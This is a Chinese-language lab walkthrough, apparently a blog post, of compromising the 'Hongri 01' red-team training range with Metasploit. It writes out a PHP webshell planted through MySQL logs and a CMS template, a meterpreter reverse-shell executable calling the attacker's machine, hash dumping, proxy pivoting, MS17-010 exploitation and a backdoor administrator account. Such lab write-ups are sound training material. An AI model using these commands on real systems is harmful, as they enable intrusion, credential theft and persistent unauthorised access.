---
title: "红日靶场01（MSF）"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 红日靶场01 ATT&CK红队评估（msf）

第一次记录这个，写的一般，推荐看我CS打的更有条理QAQ

### 外网

##### 信息收集

首先扫描C段找一下目标站点IP：

~~~sh
netdiscover -i eth0 -r 192.168.221.0/24
~~~

找到站点外网IP为`192.168.221.133`

![image-20240417123010268](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240417123010268.png)

接下来进行端口扫描

![image-20240417123136811](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240417123136811.png)

发现80端口开启，并且站点开启了mysql服务

访问80端口，是一个phpinfo()页面，且可以进行mysql连接测试

使用root，root发现mysql存在弱口令

![image-20240417123425756](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240417123425756.png)

接下来使用dirsearch扫描一下网站目录，发现存在phpmyadmin后台

![image-20240417123532333](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240417123532333.png)

进入发现存在root，root弱口令，登陆成功，发现后台可执行sql语句，尝试写马

* 查看数据库是否有导入权限，看能否直接导入木马

  ~~~sql
  SHOW GLOBAL VARIABLES LIKE '%secure%'
  ~~~

  发现没有权限

* 查看是否有开启日志记录

  ~~~sql
  SHOW GLOBAL VARIABLES LIKE ‘%general%’
  ~~~

  发现功能关闭

* 开启全局日志

  ~~~sql
  SET GLOBAL general_log = ON
  ~~~

* 指定日志写入到网站根目录

  ~~~sql
  set GLOBAL general_log_file='C:/phpStudy/WWW/log.php'
  ~~~

* 写马

  ~~~sql
  select '<?php eval($_POST[1]);?>'
  ~~~

* 访问log.php可查看日志，用蚁剑连接即可getshell

  ![image-20240417181412963](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240417181412963.png)

用蚁剑连接后，发现目录存在其他网站，访问/yxcms：

发现网站首页存在默认密码泄露，经尝试，可直接登入后台

![image-20240417181813070](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240417181813070.png)

进入后台，发现可以在前台模板写入一句话木马

![image-20240417182449503](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240417182449503.png)

查找路径为`/yxcms/protected/apps/default/view/default/shell2.php`，访问，连接成功

**tips**：这里还存在目录浏览漏洞，访问没有默认页面的目录，可以遍历目录文件

### 后渗透

##### msf生成exe远连目标机

* 启动msfconsole：

  ~~~sh
  msfconsole
  ~~~

* 选择生成反向连接程序

  ~~~sh
  use payload windows/x64/meterpreter/reverse_tcp
  ~~~

* 设置参数（攻击机ip和端口）

  ~~~sh
  set LHOST 192.168.221.128
  
  set LPORT 5555
  ~~~

* 生成exe：

  ~~~sh
  generate -f exe -o 64.exe
  ~~~

* 设置监听：

  ~~~sh
  use exploit/multi/handler
  ~~~

* 设置各参数：

  ~~~sh
  set payload windows/x64/meterpreter/reverse_tcp
  
  set LHOST 0.0.0.0
  
  set LPORT 5555
  
  run
  ~~~

##### 上传并运行exe文件

用蚁剑向目标机的C盘上传64.exe，开启终端运行该程序：

~~~cmd
C:\phpStudy\WWW> cd C:\

C:\> 64.exe
~~~

成功反连：

![image-20240418013613639](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240418013613639.png)

* 提权

  getuid查看权限，发现已经是system权限（看网上都是administrator，需要getsystem简单提权一下，这里不知道为什么不一样）

* 获取账号密码

  ~~~sh
  hashdump
  ~~~

### 横向移动

横向渗透前，先将该web服务器配置为代理服务器当作跳板机

* 用msf直接搭建sock隧道：

  进入session，自动创建路由：

  ~~~sh
  run post/multi/manage/autoroute
  ~~~

![image-20240418182412942](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240418182412942.png)

* 查看路由

  ~~~sh
  run autoroute -p
  ~~~

  ![image-20240418182617722](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240418182617722.png)

* 退到上层，使用socks进行代理，端口与proxychains里设置一致即可：

  ~~~sh
  background
  
  use auxiliary/server/socks_proxy
  
  set VERSION 4a
  
  set SRVHOST 127.0.0.1
  
  exploit
  ~~~

  成功挂起一个job

  ![image-20240418184255512](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240418184255512.png)

  修改proxychains4.conf

  ~~~sh
  vim /etc/proxychains4.conf
  ~~~


* arp 探测内网存活主机

  ~~~sh
  use post/windows/gather/arp_scanner
  
  set RHOSTS 192.168.52.0/24
  
  set SESSION 1
  
  exploit
  ~~~

  发现结果

  ![image-20240418185755706](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240418185755706.png)

* udp协议探测内网存活主机

  ~~~sh
  use auxiliary/scanner/discovery/udp_sweep
  
  set RHOSTS 192.168.52.0/24
  
  run
  ~~~

  ![image-20240418211609907](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240418211609907.png)

  查看结果发现有三个内网主机存活分别是：

  * 192.168.221.138
  * 192.168.221.141
  * 192.168.221.143

* 开始进行域内信息收集

  ~~~sh
  net view                 # 查看局域网内其他主机名
  net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
  net user                 # 查看本机用户列表
  net user /domain         # 查看域用户
  net localgroup administrators # 查看本地管理员组（通常会有域用户）
  net view /domain         # 查看有几个域
  net user 用户名 /domain   # 获取指定域用户的信息
  net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
  net group 组名 /domain    # 查看域中某工作组
  net group "domain admins" /domain  # 查看域管理员的名字
  net group "domain computers" /domain  # 查看域中的其他主机名
  net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）
  ~~~

* 在shell中查看域信息

  ~~~sh
  net view
  ~~~

  ![image-20240420181326090](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240420181326090.png)

  查看主域信息

  ~~~sh
  net view /domain
  ~~~

  ![image-20240418214105971](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240418214105971.png)

* 横向渗透控制其他主机

  对其他内网主机进行端口探测

  ~~~sh
  proxychains nmap -sS -sV -Pn 192.168.52.141
  ~~~

  ![image-20240419010914517](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240419010914517.png)

  发现开放了445端口，可以尝试MS17_010进行攻击

  ![image-20240419013306832](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240419013306832.png)

  漏洞存在，尝试getshell

  使用psexec失败

  <img src="C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240419013713406.png" alt="image-20240419013713406"  />

  试试其他的：

  ![image-20240419014237117](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240419014237117.png)

  经尝试，可使用command来getshell

  ![image-20240419014401696](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240419014401696.png)

  接下来尝试添加用户

  由于密码设置策略，密码不能太简单且不能包含用户名

  ~~~sh
  set COMMAND net user yuyoung songxue@123 /add
  
  run
  ~~~

  然后把添加的用户加入管理员组

  ~~~sh
  set COMMAND net localgroup administrators yuyoung /add
  
  run
  ~~~

  一般可以打开3389远连，这里使用23端口的telnet服务

  ~~~sh
  set COMMAND sc config tlntsvr start= auto
  
  run
  
  set COMMAND net start telnet
  
  run
  
  set COMMAND netstat -an
  #查看一下23端口号是否开启
  run
  ~~~

  ![image-20240419020818483](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240419020818483.png)

  成功

  接下来telnet连接

  ~~~sh
  use auxiliary/scanner/telnet/telnet_login
  
  set RHOSTS 192.168.52.141
  
  set username yuyoung
  
  set PASSWORD songxue@123
  
  run
  ~~~

  登陆成功

  ![image-20240420183510734](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240420183510734.png)

  直接telnet建立会话

  ![image-20240420183908971](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240420183908971.png)

  成功拿下成员主机

  ctrl+] 再输入q退出telnet

* 转换方向，尝试拿下域控

  首先扫描端口

  ![image-20240420182134944](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240420182134944.png)

  开放了445端口，再次尝试永恒之蓝

  不知道是不是防火墙的原因，不成功，最后只能尝试使用CS直接横向移动getshell，这里按道理可以利用哈希传递攻击进行横向移动，可以参考我CS版的文章

  ![image-20240420202537589](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20240420202537589.png)

